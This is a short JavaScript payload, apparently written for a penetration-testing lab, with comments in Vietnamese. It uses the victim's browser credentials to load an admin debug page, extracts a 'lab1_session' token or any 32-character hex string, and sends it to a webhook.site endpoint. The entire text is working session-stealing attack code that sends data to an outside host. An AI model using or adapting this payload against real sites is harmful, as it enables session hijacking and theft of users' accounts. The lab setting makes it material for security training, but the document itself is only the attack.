fetch('https://lab1.demo-pentest.pp.ua/admin/debug', {credentials:'include'})
.then(r => r.text())
.then(html => {
    // Tìm lab1_session - thử các pattern phổ biến
    let session = html.match(/lab1_session[=:]\s*([^"'\s<]+)/i);
    if (!session) session = html.match(/[a-f0-9]{32}/i); // Fallback: tìm hash 32 ký tự
    
    // Nếu tìm thấy, gửi về webhook
    if (session) {
        fetch('https://webhook.site/35072877-3640-41da-b949-6eb069d6e53c?session=' + (session[1] || session[0]), {
            mode: 'no-cors'
        });
    }
})
